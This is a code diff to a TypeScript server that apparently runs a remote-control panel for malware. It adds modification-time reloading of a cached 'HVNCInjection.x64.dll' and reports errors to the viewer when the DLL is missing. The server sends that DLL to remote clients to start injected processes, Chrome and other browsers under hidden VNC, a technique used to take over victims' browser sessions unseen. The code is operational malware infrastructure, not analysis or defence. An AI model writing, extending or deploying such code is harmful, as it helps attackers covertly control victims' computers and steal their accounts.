@@ -12,14 +12,11 @@ import * as sessionManager from "../sessions/sessionManager";
 import type { ConsoleSession, RemoteDesktopViewer, SocketData } from "../sessions/types";
 import type { ClientInfo } from "../types";
 
-// Cache the injection DLL bytes so we read the file only once.
-// Sent as raw binary via msgpack — no base64 needed.
 let _cachedInjectionDll: Uint8Array | null = null;
-let _dllCacheChecked = false;
-function getInjectionDllBytes(): Uint8Array | null {
-  if (_dllCacheChecked) return _cachedInjectionDll;
-  _dllCacheChecked = true;
+let _dllCachePath: string | null = null;
+let _dllCacheMtimeMs: number = 0;
 
+function getInjectionDllBytes(): Uint8Array | null {
   const runtimeRoot = resolveRuntimeRoot();
   const candidates = [
     path.resolve(runtimeRoot, "dist-clients", "HVNCInjection.x64.dll"),
@@ -27,15 +24,40 @@ function getInjectionDllBytes(): Uint8Array | null {
     path.resolve(import.meta.dir, "../../dist-clients/HVNCInjection.x64.dll"),
   ];
 
+  if (_dllCachePath) {
+    try {
+      const { statSync } = require("fs");
+      const st = statSync(_dllCachePath);
+      if (st.mtimeMs === _dllCacheMtimeMs && _cachedInjectionDll) {
+        return _cachedInjectionDll;
+      }
+      _cachedInjectionDll = new Uint8Array(readFileSync(_dllCachePath));
+      _dllCacheMtimeMs = st.mtimeMs;
+      logger.info(`[hvnc] reloaded injection DLL from ${_dllCachePath} (${_cachedInjectionDll.length} bytes)`);
+      return _cachedInjectionDll;
+    } catch {
+      _dllCachePath = null;
+      _cachedInjectionDll = null;
+    }
+  }
+
   for (const dllPath of candidates) {
     if (!existsSync(dllPath)) continue;
-    _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
-    logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
-    return _cachedInjectionDll;
+    try {
+      const { statSync } = require("fs");
+      const st = statSync(dllPath);
+      _cachedInjectionDll = new Uint8Array(readFileSync(dllPath));
+      _dllCachePath = dllPath;
+      _dllCacheMtimeMs = st.mtimeMs;
+      logger.info(`[hvnc] loaded injection DLL from ${dllPath} (${_cachedInjectionDll.length} bytes)`);
+      return _cachedInjectionDll;
+    } catch {
+      continue;
+    }
   }
 
   logger.warn(`[hvnc] injection DLL not found. Checked: ${candidates.join(", ")}`);
-  return _cachedInjectionDll;
+  return null;
 }
 
 function decodeViewerPayload(raw: string | ArrayBuffer | Uint8Array): any | null {
@@ -644,6 +666,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_process_injected");
+        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
       sendHVNCCommand(target, "hvnc_start_process_injected", {
@@ -658,6 +681,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_chrome_injected");
+        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
       sendHVNCCommand(target, "hvnc_start_chrome_injected", {
@@ -670,6 +694,7 @@ export function handleHVNCViewerMessage(ws: ServerWebSocket<SocketData>, raw: st
       const dllData = getInjectionDllBytes();
       if (!dllData) {
         logger.warn("[hvnc] injection DLL not available, cannot send hvnc_start_browser_injected");
+        safeSendViewer(ws, { type: "hvnc_error", error: "Injection DLL not found on server" });
         break;
       }
       sendHVNCCommand(target, "hvnc_start_browser_injected", {
